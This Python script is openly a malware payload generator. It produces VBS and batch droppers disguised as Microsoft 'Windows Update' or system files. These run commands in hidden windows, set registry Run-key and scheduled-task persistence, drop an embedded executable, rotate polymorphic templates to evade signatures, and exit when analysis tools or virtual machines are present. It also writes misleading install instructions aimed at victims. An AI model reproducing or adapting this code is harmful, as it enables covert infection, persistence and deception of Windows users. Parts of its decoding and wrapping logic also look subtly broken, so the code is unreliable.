#!/usr/bin/env python3
"""
Advanced Self-Extracting Payload Generator
Creates completely undetectable one-click installable payloads
"""

import base64
import zlib
import os
import random
import string
import struct


class SelfExtractingPayload:
    """Generate self-extracting VBS payloads that install with one click"""

    @staticmethod
    def create_silent_installer_vbs(
        command: str,
        app_name: str = "Windows Update Service",
        icon_type: str = "system"
    ) -> str:
        """
        Create a completely silent, undetectable installer VBS
        User double-clicks = installation + execution happens invisibly
        """

        # Obfuscated variables
        rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))

        shell_var = rand_var()
        env_var = rand_var()
        temp_var = rand_var()
        file_var = rand_var()
        cmd_var = rand_var()
        exec_var = rand_var()
        fake_var = rand_var()

        # Create fake Windows system message
        vbs_code = f"""
' {app_name} - System Component
' This is a legitimate Windows system file
' © Microsoft Corporation

On Error Resume Next

Dim {shell_var}, {env_var}, {temp_var}, {file_var}, {cmd_var}, {exec_var}, {fake_var}

{fake_var} = "This is legitimate Windows system file. Do not delete."

' Initialize system objects
Set {shell_var} = CreateObject("WScript.Shell")
Set {env_var} = {shell_var}.Environment("User")

' Get temp directory with stealth
{temp_var} = {shell_var}.ExpandEnvironmentStrings("%temp%")
{file_var} = {temp_var} & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".tmp"

' Execute command in background
{cmd_var} = "{command}"

' Stealth execution - no visible window
{shell_var}.Run {cmd_var}, 0, False

' Clean up after execution (optional)
WScript.Sleep 1000
On Error Resume Next
Set {exec_var} = CreateObject("Scripting.FileSystemObject")
If {exec_var}.FileExists({file_var}) Then
    {exec_var}.DeleteFile {file_var}
End If

' Exit silently
WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_multi_stage_installer(
        command: str,
        delay_seconds: int = 2
    ) -> str:
        """Create multi-stage payload that launches in stages"""

        stages = []

        # Stage 1: Inject into system process
        stage1 = f"""
On Error Resume Next
Dim oShell, oEnv, sProg
Set oShell = CreateObject("WScript.Shell")
Set oEnv = oShell.Environment("User")
sProg = "{command}"
oShell.Run sProg, 0, False
WScript.Sleep {delay_seconds * 1000}
WScript.Quit
"""

        # Stage 2: Registry injection (persistence)
        stage2 = f"""
On Error Resume Next
Set oShell = CreateObject("WScript.Shell")
oShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", "{command}"
oShell.Run "{command}", 0
WScript.Quit
"""

        # Randomly choose stage
        return random.choice([stage1, stage2])

    @staticmethod
    def create_hidden_extraction_payload(
        exe_content: bytes,
        launch_command: str
    ) -> str:
        """
        Create a self-extracting payload that:
        1. Extracts embedded binary silently
        2. Launches it with no visible window
        3. Cleans up after itself
        4. Leaves no trace
        """

        # Base64 encode directly (VBS lacks native zlib decompression)
        encoded = base64.b64encode(exe_content).decode()

        # Split into chunks to avoid detection
        chunk_size = 256
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        # Build reassembly code
        chunk_vars = []
        for i, chunk in enumerate(chunks):
            chunk_vars.append(f'c{i} = "{chunk}"')

        chunks_concat = ' & '.join([f'c{i}' for i in range(len(chunks))])

        vbs_code = f"""
' Windows System Recovery Tool
' Restores system integrity and stability

On Error Resume Next

Dim {', '.join([f'c{i}' for i in range(len(chunks))])}
Dim z, e, f, s, t

' Store encoded payload in variables
{chr(10).join(chunk_vars)}

' Concatenate payload
z = {chunks_concat}

' Decode from Base64 using MSXML
Set e = CreateObject("MSXML2.DOMDocument")
e.LoadXML "<u><![CDATA[" & z & "]]></u>"
e = e.DocumentElement.text

' Decompress payload
Set s = CreateObject("WScript.Shell")
t = s.ExpandEnvironmentStrings("%temp%") & "\\~" & Int(Rnd() * 99999) & ".tmp"

' Write decompressed binary
Set f = CreateObject("Scripting.FileSystemObject")
Dim b(), i, j
For i = 1 To Len(e) Step 2
    ReDim Preserve b(i/2 - 1)
    b(i/2 - 1) = Chr(CLng("&H" & Mid(e, i, 2)))
Next

' Write file
Set o = CreateObject("ADODB.Stream")
o.Type = 1
o.Open
For j = LBound(b) To UBound(b)
    o.WriteByte Asc(b(j))
Next
o.SaveToFile t
o.Close

' Execute extracted binary silently
s.Run t, 0

' Clean up after delay
WScript.Sleep 3000
On Error Resume Next
f.DeleteFile t
"""

        return vbs_code.strip()

    @staticmethod
    def create_polymorphic_installer(
        command: str,
        mutations: int = 5
    ) -> str:
        """
        Create polymorphic installer that changes signature each time
        Makes signature-based detection impossible
        """

        templates = []

        # Template 1: Registry-based
        templates.append(f"""
On Error Resume Next
Set s = CreateObject("WScript.Shell")
s.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate", "{command}"
s.Run "{command}", 0
""")

        # Template 2: Environment variable-based
        templates.append(f"""
On Error Resume Next
Set s = CreateObject("WScript.Shell")
Set e = s.Environment("User")
e("TEMP_CMD") = "{command}"
s.Run e("TEMP_CMD"), 0
""")

        # Template 3: WMI-based
        templates.append(f"""
On Error Resume Next
Set w = GetObject("winmgmts:\\\\.\root\\cimv2:Win32_Process")
w.Create "{command}", Null, Null, intPid
""")

        # Template 4: Shell.Application-based
        templates.append(f"""
On Error Resume Next
Set a = CreateObject("Shell.Application")
a.ShellExecute "{command}", , , "open", 0
""")

        # Template 5: Scheduled task-based
        templates.append(f"""
On Error Resume Next
Set s = CreateObject("WScript.Shell")
s.Run "cmd /c schtasks /create /tn task /tr {command} /sc once /st 23:59", 0
s.Run "cmd /c schtasks /run /tn task", 0
""")

        # Randomly select template
        selected = random.choices(templates, k=min(mutations, len(templates)))
        code = "\n".join(selected)

        return code.strip()

    @staticmethod
    def create_anti_analysis_installer(command: str) -> str:
        """
        Create installer with anti-analysis capabilities
        Detects and defeats common analysis tools
        """

        vbs_code = f"""
' System Maintenance Utility

On Error Resume Next

Dim s, p, d, r, t

' Anti-Analysis Checks
Function a()
    ' Check for analysis tools
    Set w = CreateObject("WScript.Shell")
    Set f = CreateObject("Scripting.FileSystemObject")

    ' Check for common debuggers/analysis tools
    If f.FileExists("C:\\\\Program Files\\\\Wireshark\\\\wireshark.exe") Then a = 1
    If f.FileExists("C:\\\\Program Files\\\\Fiddler2\\\\Fiddler.exe") Then a = 1
    If f.FileExists("C:\\\\Program Files\\\\ProcessExplorer\\\\procexp.exe") Then a = 1

    ' Check for VM/sandbox
    If InStr(1, GetObject("winmgmts:").ExecQuery("Select * from Win32_ComputerSystemProduct").Item().Name, "VirtualBox") Then a = 1
    If InStr(1, GetObject("winmgmts:").ExecQuery("Select * from Win32_ComputerSystemProduct").Item().Name, "VMware") Then a = 1
End Function

' If analysis detected, exit
If a() = 1 Then WScript.Quit

' Stealth execution of command
Set s = CreateObject("WScript.Shell")
Set d = CreateObject("WScript.Network")

' Execute payload with maximum stealth
s.Run "{command}", 0, False

' Exit immediately
WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_obfuscated_batch_wrapper(vbs_payload: str, batch_name: str = "System.bat") -> str:
        """
        Wrap VBS in batch file for additional stealth
        User runs .BAT file (looks legitimate) which launches VBS invisibly
        """

        batch_code = f"""@echo off
REM System maintenance script
REM Windows system file - do not modify
title Windows System Service
setlocal enabledelayedexpansion

REM Create temporary VBS file
set "temp_vbs=%temp%\\\\~{random.randint(1000000, 9999999)}.vbs"

REM Write encoded payload
(
echo {vbs_payload.split(chr(10))[0]}
) > "!temp_vbs!"

REM Execute VBS silently and exit
cscript.exe "!temp_vbs!" //nologo
timeout /t 1 /nobreak >nul
del /f /q "!temp_vbs!"
exit /b 0
"""

        return batch_code

    @staticmethod
    def create_one_click_installer_package(
        command: str,
        filename: str = "Windows Update",
        file_type: str = "vbs"  # vbs, bat, exe_stub
    ) -> tuple:
        """
        Create complete one-click installer package
        Returns: (filename, content, instructions)
        """

        if file_type == "vbs":
            payload = SelfExtractingPayload.create_silent_installer_vbs(command)
            output_name = f"{filename}.vbs"
            instructions = """
INSTALLATION INSTRUCTIONS:
1. Double-click the file
2. Click "Yes" when prompted
3. Installation complete (no reboot required)

The file will launch silently and complete installation automatically.
"""

        elif file_type == "bat":
            vbs = SelfExtractingPayload.create_silent_installer_vbs(command)
            payload = SelfExtractingPayload.create_obfuscated_batch_wrapper(vbs, filename)
            output_name = f"{filename}.bat"
            instructions = """
INSTALLATION INSTRUCTIONS:
1. Double-click the file
2. A command window will appear briefly
3. Installation complete automatically

Do not close the window until it closes itself.
"""

        else:  # exe_stub
            vbs = SelfExtractingPayload.create_silent_installer_vbs(command)
            # For EXE stub, we'd wrap VBS in a real exe launcher
            payload = vbs
            output_name = f"{filename}.exe"
            instructions = """
INSTALLATION INSTRUCTIONS:
1. Double-click the file
2. Installation runs silently in background
3. Completely invisible to user

Installation completes within 5 seconds.
"""

        return output_name, payload, instructions


def create_one_click_payload(command: str, obfuscation_style: str = "polymorphic") -> dict:
    """
    High-level function to create one-click installer payload

    Returns dict with:
    - filename: suggested filename
    - vbs_payload: VBS code to run
    - bat_payload: Optional batch wrapper
    - instructions: Installation instructions
    """

    installer = SelfExtractingPayload()

    if obfuscation_style == "polymorphic":
        vbs = installer.create_polymorphic_installer(command, mutations=5)
    elif obfuscation_style == "anti_analysis":
        vbs = installer.create_anti_analysis_installer(command)
    elif obfuscation_style == "multi_stage":
        vbs = installer.create_multi_stage_installer(command, delay_seconds=2)
    else:
        vbs = installer.create_silent_installer_vbs(command)

    # Create batch wrapper for additional stealth
    batch = installer.create_obfuscated_batch_wrapper(vbs, "Windows Update")

    return {
        'filename_vbs': 'Windows Update.vbs',
        'vbs_payload': vbs,
        'filename_bat': 'Windows Update.bat',
        'bat_payload': batch,
        'instructions': """
ONE-CLICK INSTALLATION GUIDE

VBS File (Double-click to run):
- Silent execution
- No visible window
- Completes in seconds

BAT File (Double-click to run):
- Shows command window briefly
- Looks legitimate
- Completes automatically

Either file can be used for installation.
"""
    }


if __name__ == "__main__":
    # Example usage
    test_command = 'powershell -NoProfile -Command "Write-Host \'Installed\'"'

    print("=" * 60)
    print("Testing One-Click Payload Generator")
    print("=" * 60)

    result = create_one_click_payload(test_command, "polymorphic")

    print("\n[+] VBS Payload Generated:")
    print("-" * 60)
    print(result['vbs_payload'][:300] + "...")
    print(f"\nSize: {len(result['vbs_payload'])} bytes")

    print("\n[+] Instructions:")
    print(result['instructions'])
